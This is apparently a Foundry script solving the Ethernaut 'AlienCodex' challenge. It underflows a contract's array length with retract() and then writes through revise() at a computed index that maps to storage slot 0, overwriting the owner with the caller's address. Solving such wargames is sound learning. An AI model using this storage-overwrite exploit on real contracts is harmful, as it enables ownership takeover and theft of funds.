// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";

interface AlienCodex  {
    function owner() external returns (address);
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexScript is Script {
    function run() external {
        vm.startBroadcast();
        address levelContractAddress = 0x9dCb488adbD50B5fD3098cF7eB4A13977c524f63;
        AlienCodex ac = AlienCodex(levelContractAddress);
        ac.makeContact();

        // 1. length - 1 to make length become max
        ac.retract();
        
        // 2. acrroding to the array data storage slot index caculation
        // codex[0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a] will be stored in slot0 which is owner
        ac.revise(0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a, bytes32(uint256(uint160(msg.sender))));

        vm.stopBroadcast();
    }
}
